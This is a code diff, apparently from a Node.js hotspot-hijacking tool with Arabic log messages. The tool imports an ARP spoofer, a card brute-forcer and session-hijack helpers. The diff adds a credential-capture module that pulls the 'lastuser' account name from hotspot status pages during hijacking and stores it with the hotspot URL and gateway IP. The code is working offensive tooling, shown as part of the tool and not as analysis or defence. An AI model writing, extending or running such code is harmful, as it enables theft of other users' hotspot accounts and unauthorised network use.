@@ -8,6 +8,7 @@ const hotspotAuth = require('./hotspot-auth');
 const arpSpoofer = require('./arp-spoofer');
 const sessionStore = require('./session-store');
 const cardBruteForce = require('./card-bruteforce');
+const credentialCapture = require('./credential-capture');
 const config = require('../../config/default.json');
 
 const CHECK_SCRIPT = path.join(__dirname, '..', '..', 'scripts', 'check-session.ps1');
@@ -137,6 +138,13 @@ async function detectHotspot(gatewayIp) {
 
   if (found) {
     emitLog(`📡 تم العثور على الهوتسبوت: ${found.value.url}`);
+    if (found.value.sessionActive && found.value.data) {
+      const lastuser = credentialCapture.parseLastuser(found.value.data);
+      if (lastuser) {
+        credentialCapture.addCredential(lastuser, { source: 'hijack-detect', hotspotUrl: found.value.url, gatewayIp: gatewayIp });
+        emitLog(`👤 تم اكتشاف lastuser: ${lastuser}`, 'success');
+      }
+    }
     return { found: true, url: found.value.url, sessionActive: found.value.sessionActive };
   }
 
@@ -153,6 +161,11 @@ async function checkSessionViaStatus(baseUrl, maxAttempts = 5) {
       const snippet = html ? html.substring(0, 150).replace(/\n/g, ' ').trim() : '(فارغ)';
       if (html.includes('remain_bytes_total') || html.includes('تم تسجيل') || html.includes('status.html')) {
         emitLog(`✅ الرد من ${statusUrl} ← HTTP ${resp.status} (${html.length}b) — [جلسة نشطة] ${snippet}`);
+        const lastuser = credentialCapture.parseLastuser(html);
+        if (lastuser) {
+          credentialCapture.addCredential(lastuser, { source: 'hijack-session-wait', hotspotUrl: baseUrl });
+          emitLog(`👤 تم اكتشاف lastuser: ${lastuser}`, 'success');
+        }
         return { sessionActive: true, remainBytes: 'available', httpStatus: resp.status, bodyLength: html.length };
       }
       emitLog(`⏳ في انتظار الجلسة... (${i+1}/${maxAttempts}) ← HTTP ${resp.status} (${html.length}b) ${snippet}`);
